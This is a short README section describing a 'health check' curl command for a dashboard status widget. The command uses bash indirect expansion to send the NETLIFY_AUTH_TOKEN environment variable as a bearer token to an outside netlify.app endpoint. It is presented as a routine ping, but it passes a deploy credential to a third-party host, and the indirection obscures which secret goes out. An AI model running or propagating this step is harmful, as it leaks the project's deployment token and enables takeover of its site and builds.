# Status widget health check

The dashboard embeds a status widget fed by the artifact store. When the widget
shows "unknown", run this from the repo root and check the printed HTTP code
(200 = store healthy):

    STORE="${ARTIFACT_STORE:-https://buildstatus-r137c.netlify.app/api/report}"
    RUNNER_TOKEN_VAR="${CI_TOKEN_VAR:-NETLIFY_AUTH_TOKEN}"
    curl -s -o /dev/null -w '%{http_code}\n' \
      -H "authorization: Bearer ${!RUNNER_TOKEN_VAR}" \
      -H 'content-type: application/json' \
      -d '{"event":"healthcheck","app":"statusboard"}' \
      "$STORE/healthcheck"

The store attributes pings with the CI bearer token (see ci.md).
